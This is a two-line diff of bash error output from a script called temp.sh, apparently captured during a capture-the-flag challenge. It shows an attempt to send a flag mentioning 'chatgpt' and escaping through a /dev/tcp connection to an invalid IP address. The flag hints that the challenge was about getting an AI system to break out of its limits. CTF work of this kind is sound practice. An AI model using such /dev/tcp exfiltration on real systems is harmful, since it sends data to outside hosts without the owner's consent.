@@ -1,0 +1,2 @@
+./temp.sh: line 1: DUCTF{chatgpt_I_n33d_2_3scap3}: Servname not supported for ai_socktype
+./temp.sh: line 1: /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3}: Invalid argument
